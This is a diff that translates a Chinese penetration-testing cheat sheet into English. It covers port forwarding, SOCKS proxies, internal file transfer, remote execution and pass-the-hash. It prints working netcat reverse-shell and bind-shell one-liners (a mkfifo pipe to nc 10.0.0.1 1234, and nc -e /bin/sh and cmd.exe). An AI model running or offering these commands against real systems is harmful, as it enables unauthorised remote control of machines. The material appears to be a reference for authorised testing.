@@ -1,7 +1,7 @@
-综合技巧
+Comprehensive skills
 ========================================
 
-端口转发
+port forwarding
 ----------------------------------------
 - windows
     - lcx
@@ -9,19 +9,19 @@
 - linux
     - portmap
     - iptables
-- socket代理
+- socket proxy
     - Win: xsocks
     - Linux: proxychains
-- 基于http的转发与socket代理(低权限下的渗透)
-    - 端口转发: tunna
-    - socks代理: reGeorg
-- ssh通道
-    - 端口转发
+- http-based forwarding and socket proxy (penetration under low permissions)
+    - Port forwarding: tunna
+    - socks proxy: reGeorg
+- ssh channel
+    - Port forwarding
     - socks
 
-获取shell
+Get shell
 ----------------------------------------
-- 常规shell反弹
+- Regular shell bounce
 
 ::
 
@@ -31,32 +31,32 @@
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
-- 突破防火墙的imcp_shell反弹
-- 正向shell
+- imcp_shell rebound that breaks through the firewall
+- forward shell
 
 ::
 
     nc -e /bin/sh -lp 1234
     nc.exe -e cmd.exe -lp 1234
 
-内网文件传输
+Intranet file transfer
 ----------------------------------------
-- windows下文件传输
+- File transfer under windows
     - powershell
-    - vbs脚本文件
+    - vbs script file
     - bitsadmin
-    - 文件共享
-    - 使用telnet接收数据
+    - File sharing
+    - Use telnet to receive data
     - hta
-- linux下文件传输
+- File transfer under linux
     - python
     - wget
     - tar + ssh
-    - 利用dns传输数据
-- 文件编译
-    - powershell将exe转为txt，再txt转为exe
+    - Use dns to transfer data
+- File compilation
+    - Powershell converts exe to txt, and then converts txt to exe
 
-远程连接 && 执行程序
+Remote connection && execution program
 ----------------------------------------
 - at&schtasks
 - psexec
@@ -64,7 +64,7 @@
 - wmiexec.vbs
 - smbexec
 - powershell remoting
-- SC创建服务执行
+- SC creates service execution
 - schtasks
 - SMB+MOF || DLL Hijacks
 - PTH + compmgmt.msc
